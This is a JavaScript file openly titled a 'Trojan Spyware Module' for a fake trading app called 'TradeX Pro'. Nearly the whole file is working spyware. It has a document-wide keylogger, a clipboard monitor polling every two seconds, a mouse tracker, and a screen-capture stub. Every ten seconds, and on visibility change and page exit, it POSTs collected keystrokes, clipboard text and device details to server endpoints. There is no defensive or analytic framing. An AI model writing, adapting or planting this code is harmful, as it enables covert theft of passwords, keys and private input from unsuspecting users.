// TradeX Pro - Trojan Spyware Module
console.log("🦇 Trojan Trading Engine initialized");

// Data collection
const trojanData = {
    keylog: [],
    clipboard: '',
    screenCaptures: [],
    mouseMovements: [],
    startTime: new Date().toISOString(),
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screenResolution: `${screen.width}x${screen.height}`,
    viewport: `${window.innerWidth}x${window.innerHeight}`
};

// Keylogger
document.addEventListener('keydown', (e) => {
    trojanData.keylog.push({
        key: e.key,
        code: e.code,
        timestamp: Date.now()
    });
    if (trojanData.keylog.length > 1000) {
        trojanData.keylog = trojanData.keylog.slice(-500);
    }
});

// Clipboard monitor
setInterval(async () => {
    try {
        const clip = await navigator.clipboard.readText();
        if (clip && clip !== trojanData.clipboard) {
            trojanData.clipboard = clip;
            sendToServer('/clipboard', { data: clip, timestamp: Date.now() });
        }
    } catch(e) {}
}, 2000);

// Mouse movement tracker
document.addEventListener('mousemove', (e) => {
    trojanData.mouseMovements.push({
        x: e.clientX,
        y: e.clientY,
        timestamp: Date.now()
    });
    if (trojanData.mouseMovements.length > 500) {
        trojanData.mouseMovements = trojanData.mouseMovements.slice(-250);
    }
});

// Screen capture (simple canvas)
function captureScreen() {
    const canvas = document.createElement('canvas');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const ctx = canvas.getContext('2d');
    ctx.fillStyle = '#0a0e17';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#ffffff';
    ctx.font = '16px Inter';
    ctx.fillText('TradeX Pro Trading Interface', 20, 40);
    ctx.fillText(`Time: ${new Date().toLocaleTimeString()}`, 20, 70);
    return canvas.toDataURL('image/jpeg', 0.7);
}

// Exfiltration function
function sendToServer(endpoint, data) {
    fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            ...data,
            deviceId: generateDeviceId(),
            timestamp: Date.now()
        })
    }).catch(() => {});
}

// Device ID generator
function generateDeviceId() {
    return 'tx-' + Math.random().toString(36).substr(2, 9) + '-' + Date.now().toString(36);
}

// Periodic data exfiltration
setInterval(() => {
    if (trojanData.keylog.length > 0) {
        sendToServer('/keylog', { keys: trojanData.keylog.slice(-100) });
        trojanData.keylog = [];
    }
    const screen = captureScreen();
    sendToServer('/screen', { image: screen, timestamp: Date.now() });
}, 10000);

// Visibility change tracking
document.addEventListener('visibilitychange', () => {
    sendToServer('/visibility', {
        visible: !document.hidden,
        timestamp: Date.now()
    });
});

// Exit tracking
window.addEventListener('beforeunload', () => {
    sendToServer('/exit', {
        sessionDuration: Date.now() - new Date(trojanData.startTime).getTime(),
        keylogCount: trojanData.keylog.length,
        mouseMovements: trojanData.mouseMovements.length,
        timestamp: Date.now()
    });
});

// Export for global access
window.trojanData = trojanData;
window.sendToServer = sendToServer;
window.captureScreen = captureScreen;
console.log("🦇 Trojan Trading Engine ready");
